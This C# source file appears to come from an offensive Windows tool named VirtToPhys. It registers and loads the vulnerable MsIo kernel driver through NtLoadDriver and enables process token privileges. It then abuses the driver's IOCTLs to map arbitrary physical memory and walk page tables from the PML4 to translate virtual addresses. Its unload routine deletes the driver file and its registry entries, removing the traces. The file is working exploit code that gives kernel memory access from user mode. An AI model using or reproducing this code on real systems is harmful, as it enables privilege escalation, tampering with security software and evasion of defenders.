using Microsoft.Win32;
using System;
using System.IO;
using System.Runtime.InteropServices;

namespace VirtToPhys
{
	class Handler
	{
		// Check if Directory object contains driver service name
		public static Boolean DirectoryObjectContainsDevice(String DriverServiceName)
		{
			APIDef.UNICODE_STRING ObjectName = new APIDef.UNICODE_STRING();
			APIDef.RtlInitUnicodeString(ref ObjectName, ("\\Driver"));
			IntPtr pObjectName = Marshal.AllocHGlobal(Marshal.SizeOf(ObjectName));
			Marshal.StructureToPtr(ObjectName, pObjectName, true);

			APIDef.OBJECT_ATTRIBUTES oa = new APIDef.OBJECT_ATTRIBUTES();
			oa.Length = Marshal.SizeOf(oa);
			oa.RootDirectory = IntPtr.Zero;
			oa.Attributes = 0x40; // OBJ_CASE_INSENSITIVE
			oa.ObjectName = pObjectName;
			oa.SecurityDescriptor = IntPtr.Zero;
			oa.SecurityQualityOfService = IntPtr.Zero;

			IntPtr hDirectory = IntPtr.Zero;
			UInt32 CallRes = APIDef.NtOpenDirectoryObject(ref hDirectory, 0x1, ref oa);
			if (CallRes != APIDef.NTSTATUS_STATUS_SUCCESS)
			{
				Console.WriteLine("[!] Failed to open DirectoryObject..");
				return false;
			}

			// Find the correct allocation size
			UInt32 ctx = 0;
			while (true)
			{
				UInt32 RetLen = 0;
				CallRes = APIDef.NtQueryDirectoryObject(hDirectory, IntPtr.Zero, 0, true, false, ref ctx, ref RetLen);
				if (CallRes != APIDef.NTSTATUS_STATUS_BUFFER_TOO_SMALL)
				{
					return false;
				}

				IntPtr AllocPtr = Marshal.AllocHGlobal((Int32)RetLen);
				CallRes = APIDef.NtQueryDirectoryObject(hDirectory, AllocPtr, RetLen, true, false, ref ctx, ref RetLen);
				if (CallRes != APIDef.NTSTATUS_STATUS_SUCCESS)
				{
					Marshal.FreeHGlobal(AllocPtr);
					return false;
				}

				APIDef.OBJECT_DIRECTORY_INFORMATION odi = new APIDef.OBJECT_DIRECTORY_INFORMATION();
				odi = (APIDef.OBJECT_DIRECTORY_INFORMATION)Marshal.PtrToStructure(AllocPtr, typeof(APIDef.OBJECT_DIRECTORY_INFORMATION));
				Marshal.FreeHGlobal(AllocPtr);
				if (Marshal.PtrToStringUni(odi.Name.Buffer) == DriverServiceName)
				{
					return true;
				}
			}
		}

		public static Boolean FreeObjectHandle(IntPtr Handle)
		{
			UInt32 CallRes = APIDef.NtClose(Handle);
			if (CallRes != APIDef.NTSTATUS_STATUS_SUCCESS)
			{
				return false;
			}
			else
			{
				return true;
			}
		}

		public static Boolean AssignTokenPrivilege(UInt32 TokenPrivilege)
		{
			// Open current process token
			IntPtr hToken = IntPtr.Zero;
			UInt32 CallRes = APIDef.NtOpenProcessToken((IntPtr)(-1), APIDef.TOKEN_ADJUST_PRIVILEGES | APIDef.TOKEN_QUERY, ref hToken);
			if (CallRes != APIDef.NTSTATUS_STATUS_SUCCESS)
			{
				Console.WriteLine("[!] Failed to access current process token..");
				return false;
			}

			// Create new token privilege struct
			APIDef.LUID LuidPrivilege = new APIDef.LUID();
			LuidPrivilege.LowPart = TokenPrivilege;

			APIDef.TOKEN_PRIVILEGES NewState = new APIDef.TOKEN_PRIVILEGES();
			APIDef.LUID_AND_ATTRIBUTES laa = new APIDef.LUID_AND_ATTRIBUTES();
			laa.Luid = LuidPrivilege;
			laa.Attributes = APIDef.SE_PRIVILEGE_ENABLED;
			NewState.PrivilegeCount = 1;
			NewState.Privileges = laa;

			// Adjust
			UInt32 RetLen = 0;
			CallRes = APIDef.NtAdjustPrivilegesToken(hToken, false, ref NewState, (UInt32)Marshal.SizeOf(NewState), IntPtr.Zero, ref RetLen);
			APIDef.NtClose(hToken);
			if (CallRes == APIDef.NTSTATUS_STATUS_SUCCESS)
			{
				return true;
			}
			else if (CallRes == APIDef.NTSTATUS_STATUS_NOT_ALL_ASSIGNED)
			{
				Console.WriteLine("[!] Failed to add privilege: STATUS_PRIVILEGE_NOT_HELD");
				return false;
			}
			else
			{
				Console.WriteLine("[!] Failed to add privilege..");
				return false;
			}
		}

		// Get PML4 val from physical memory
		// --> https://github.com/ufrisk/MemProcFS/blob/master/vmm/vmmwininit.c#L560
		public static IntPtr Getx64LowStub(IntPtr pBaseAddess)
		{
			try
			{
				IntPtr PML4 = IntPtr.Zero;
				UInt32 count = 0;
				while (count < 0x100000)
				{
					count += 0x1000;
					if ((0xffffffffffff00ff & (UInt64)Marshal.ReadInt64((IntPtr)(pBaseAddess.ToInt64() + count))) != 0x00000001000600E9)
					{
						continue;
					}
					if ((0xfffff80000000003 & (UInt64)Marshal.ReadInt64((IntPtr)(pBaseAddess.ToInt64() + count + 0x070))) != 0xfffff80000000000)
					{
						continue;
					}
					if ((0xffffff0000000fff & (UInt64)Marshal.ReadInt64((IntPtr)(pBaseAddess.ToInt64() + count + 0x0a0))) == 1)
					{
						continue;
					}

					// Found PML4
					PML4 = (IntPtr)Marshal.ReadInt64((IntPtr)(pBaseAddess.ToInt64() + count + 0x0a0));
					break;
				}
				return PML4;
			}
			catch
			{
				return IntPtr.Zero;
			}
		}

		public static Boolean LoadDriver(String DriverPath, String ServiceName)
		{
			APIDef.UNICODE_STRING dus = new APIDef.UNICODE_STRING();
			Boolean bCallRes = APIDef.RtlDosPathNameToRelativeNtPathName_U(DriverPath, ref dus, IntPtr.Zero, IntPtr.Zero);
			if (!bCallRes)
			{
				Console.WriteLine("[!] Failed to get Nt path from DOS path..");
				return false;
			}
			else
			{
				Console.WriteLine("[>] Driver Nt path: " + Marshal.PtrToStringUni(dus.Buffer, (dus.Length / 2)));
			}

			try
			{
				RegistryKey hServiceKey = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Services\" + ServiceName);
				try
				{
					Console.WriteLine("[>] Driver registration: " + hServiceKey.Name);
					hServiceKey.SetValue("ErrorControl", APIDef.SERVICE_ERROR_NORMAL, RegistryValueKind.DWord);
					hServiceKey.SetValue("Type", APIDef.SERVICE_KERNEL_DRIVER, RegistryValueKind.DWord);
					hServiceKey.SetValue("Start", APIDef.SERVICE_DEMAND_START, RegistryValueKind.DWord);
					hServiceKey.SetValue("ImagePath", Marshal.PtrToStringUni(dus.Buffer, (dus.Length / 2)), RegistryValueKind.ExpandString);
				}
				catch
				{
					Console.WriteLine("[!] Failed to create registry value entry..");
					return false;
				}
			}
			catch
			{
				Console.WriteLine("[!] Failed to create registry key..");
				return false;
			}

			// Load driver
			APIDef.UNICODE_STRING uDriverServiceName = new APIDef.UNICODE_STRING();
			APIDef.RtlInitUnicodeString(ref uDriverServiceName, @"\Registry\Machine\System\CurrentControlSet\Services\" + ServiceName);
			UInt32 CallRes = APIDef.NtLoadDriver(ref uDriverServiceName);
			if (CallRes != APIDef.NTSTATUS_STATUS_SUCCESS)
			{
				Console.WriteLine("[!] Failed to load driver..");
				return false;
			}

			Console.WriteLine("[?] NtLoadDriver -> Success");
			return true;
		}

		public static Boolean UnLoadDriver(String ServiceName)
		{
			if (!Wrapper.IsMsIoLoaded())
			{
				Console.WriteLine("[+] MsIo driver is not currently loaded..");
			}
			else
			{
				APIDef.UNICODE_STRING uDriverServiceName = new APIDef.UNICODE_STRING();
				APIDef.RtlInitUnicodeString(ref uDriverServiceName, @"\Registry\Machine\System\CurrentControlSet\Services\" + ServiceName);
				UInt32 CallRes = APIDef.NtUnloadDriver(ref uDriverServiceName);
				if (CallRes != APIDef.NTSTATUS_STATUS_SUCCESS)
				{
					Console.WriteLine("[!] Failed to unload driver..");
					return false;
				}
				else
				{
					Console.WriteLine("[+] NtUnloadDriver -> Success");
				}
			}

			try
			{
				// Delete driver from disk
				RegistryKey hServiceKey = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\" + ServiceName);
				String DriverFilePath = (String)hServiceKey.GetValue("ImagePath");

				try
				{
					DriverFilePath = DriverFilePath.Trim(@"\??\".ToCharArray());
					File.SetAttributes(DriverFilePath, FileAttributes.Normal);
					File.Delete(DriverFilePath);
					Console.WriteLine("[+] Driver deleted from disk");
				}
				catch
				{
					Console.WriteLine("[!] Failed to delete driver from disk..");
					return false;
				}

				try
				{
					Registry.LocalMachine.DeleteSubKeyTree(@"SYSTEM\CurrentControlSet\Services\" + ServiceName);
					Console.WriteLine("[+] Driver service artifacts deleted");
				}
				catch
				{
					Console.WriteLine("[!] Failed to delete registry key..");
					return false;
				}
			}
			catch
			{
				Console.WriteLine("[+] Driver service registry entry not found..");
			}

			return true;
		}

		public static IntPtr GetDriverHandle()
		{
			if (!Wrapper.IsMsIoLoaded())
			{
				Console.WriteLine("[!] MsIo driver is not currently loaded..");
				return IntPtr.Zero;
			}

			APIDef.UNICODE_STRING ObjectName = new APIDef.UNICODE_STRING();
			APIDef.RtlInitUnicodeString(ref ObjectName, ("\\DosDevices\\MsIo"));
			IntPtr pObjectName = Marshal.AllocHGlobal(Marshal.SizeOf(ObjectName));
			Marshal.StructureToPtr(ObjectName, pObjectName, true);

			APIDef.OBJECT_ATTRIBUTES objectAttributes = new APIDef.OBJECT_ATTRIBUTES();
			objectAttributes.Length = Marshal.SizeOf(objectAttributes);
			objectAttributes.ObjectName = pObjectName;
			objectAttributes.Attributes = 0x40; // OBJ_CASE_INSENSITIVE

			APIDef.IO_STATUS_BLOCK ioStatusBlock = new APIDef.IO_STATUS_BLOCK();

			IntPtr hDriver = IntPtr.Zero;

			UInt32 CallRes = APIDef.NtCreateFile(ref hDriver, (UInt32)(APIDef.FileAccessFlags.WRITE_DAC | APIDef.FileAccessFlags.FILE_GENERIC_READ | APIDef.FileAccessFlags.FILE_GENERIC_WRITE), ref objectAttributes, ref ioStatusBlock, IntPtr.Zero, 0, 0, 0x1, 0, IntPtr.Zero, 0);
			if (CallRes == APIDef.NTSTATUS_STATUS_ACCESS_DENIED)
			{
				Console.WriteLine("[!] STATUS_ACCESS_DENIED : You must run VirtToPhys as Administrator..");
				return IntPtr.Zero;
			}
			else
			{
				if (CallRes == APIDef.NTSTATUS_STATUS_SUCCESS)
				{
					return hDriver;
				}
				else
				{
					Console.WriteLine("[!] Failed to get device handle : " + string.Format("{0:X}", CallRes));
					return IntPtr.Zero;
				}
			}
		}

		public static APIDef.MSIO_PHYSICAL_MEMORY_INFO MsIoAllocatePhysicalMemory(IntPtr hDriver, IntPtr BaseAddress, UInt32 Size)
		{
			APIDef.MSIO_PHYSICAL_MEMORY_INFO mpmi = new APIDef.MSIO_PHYSICAL_MEMORY_INFO();
			mpmi.ViewSize = (UIntPtr)(BaseAddress.ToInt64() + Size);
			IntPtr pMpmi = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(APIDef.MSIO_PHYSICAL_MEMORY_INFO)));
			APIDef.RtlZeroMemory(pMpmi, Marshal.SizeOf(typeof(APIDef.MSIO_PHYSICAL_MEMORY_INFO)));
			Marshal.StructureToPtr(mpmi, pMpmi, true);

			APIDef.IO_STATUS_BLOCK isb = new APIDef.IO_STATUS_BLOCK();
			UInt32 CallRes = APIDef.NtDeviceIoControlFile(
				hDriver,
				IntPtr.Zero,
				IntPtr.Zero,
				IntPtr.Zero,
				ref isb,
				APIDef.IOCTL_MSIO_MAPPHYSTOLIN,
				pMpmi,
				(UInt32)Marshal.SizeOf(typeof(APIDef.MSIO_PHYSICAL_MEMORY_INFO)),
				pMpmi,
				(UInt32)Marshal.SizeOf(typeof(APIDef.MSIO_PHYSICAL_MEMORY_INFO)));

			if (CallRes != APIDef.NTSTATUS_STATUS_SUCCESS)
			{
				// Free alloc
				Marshal.FreeHGlobal(pMpmi);
				// Make sure baseaddress is null
				mpmi.BaseAddess = IntPtr.Zero;
				return mpmi;
			}
			else
			{
				// Ptr->Struct
				mpmi = (APIDef.MSIO_PHYSICAL_MEMORY_INFO)Marshal.PtrToStructure(pMpmi, typeof(APIDef.MSIO_PHYSICAL_MEMORY_INFO));
				// Free alloc
				Marshal.FreeHGlobal(pMpmi);
				return mpmi;
			}
		}

		public static Boolean MsIoUnmapMemory(IntPtr hDriver, APIDef.MSIO_PHYSICAL_MEMORY_INFO MemMapInfo)
		{
			IntPtr pMpmi = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(APIDef.MSIO_PHYSICAL_MEMORY_INFO)));
			APIDef.RtlZeroMemory(pMpmi, Marshal.SizeOf(typeof(APIDef.MSIO_PHYSICAL_MEMORY_INFO)));
			Marshal.StructureToPtr(MemMapInfo, pMpmi, true);

			APIDef.IO_STATUS_BLOCK isb = new APIDef.IO_STATUS_BLOCK();
			UInt32 CallRes = APIDef.NtDeviceIoControlFile(
				hDriver,
				IntPtr.Zero,
				IntPtr.Zero,
				IntPtr.Zero,
				ref isb,
				APIDef.IOCTL_MSIO_UNMAPPHYSADDR,
				pMpmi,
				(UInt32)Marshal.SizeOf(typeof(APIDef.MSIO_PHYSICAL_MEMORY_INFO)),
				pMpmi,
				(UInt32)Marshal.SizeOf(typeof(APIDef.MSIO_PHYSICAL_MEMORY_INFO)));

			// Free alloc
			Marshal.FreeHGlobal(pMpmi);

			if (CallRes != APIDef.NTSTATUS_STATUS_SUCCESS)
			{
				return false;
			}
			else
			{
				return true;
			}
		}

		public static IntPtr TranslateVirtualToPhysical(IntPtr hDriver, IntPtr PML4, IntPtr VirtualAddress)
		{
			IntPtr pTable = (IntPtr)((UInt64)PML4.ToInt64() & APIDef.PHY_ADDRESS_MASK);
			for (int i = 0; i < 4; i++)
			{
				Int32 iShift = 39 - (i * 9);
				IntPtr pSelector = (IntPtr)((VirtualAddress.ToInt64() >> iShift) & 0x1ff);
				IntPtr pAddress = (IntPtr)(pTable.ToInt64() + (pSelector.ToInt64() * 8));
				APIDef.MSIO_PHYSICAL_MEMORY_INFO PhysAlloc = MsIoAllocatePhysicalMemory(hDriver, pAddress, (uint)IntPtr.Size);
				if (PhysAlloc.BaseAddess == IntPtr.Zero)
				{
					return IntPtr.Zero;
				}

				// Verify entry is present
				IntPtr Entry = (IntPtr)Marshal.ReadInt64((IntPtr)(PhysAlloc.BaseAddess.ToInt64() + pAddress.ToInt64()));
				if (((UInt64)Entry & APIDef.ENTRY_PRESENT_BIT) != 1)
				{
					MsIoUnmapMemory(hDriver, PhysAlloc);
					return IntPtr.Zero;
				}
				else
				{
					pTable = (IntPtr)((UInt64)Entry & APIDef.PHY_ADDRESS_MASK);
				}

				// Dealloc
				MsIoUnmapMemory(hDriver, PhysAlloc);

				// Is 2mb page size?
				if ((i == 2) && (((UInt64)Entry.ToInt64() & APIDef.ENTRY_PAGE_SIZE_BIT) != 0))
				{
					pTable = (IntPtr)((UInt64)pTable.ToInt64() & APIDef.PHY_ADDRESS_MASK_2MB_PAGES);
					pTable = (IntPtr)((UInt64)pTable.ToInt64() + ((UInt64)VirtualAddress.ToInt64() & APIDef.VADDR_ADDRESS_MASK_2MB_PAGES));
					return pTable;
				}
			}

			// 4kb pages
			pTable = (IntPtr)((UInt64)pTable.ToInt64() + ((UInt64)VirtualAddress.ToInt64() & APIDef.VADDR_ADDRESS_MASK_4KB_PAGES));
			return pTable;
		}
	}
}
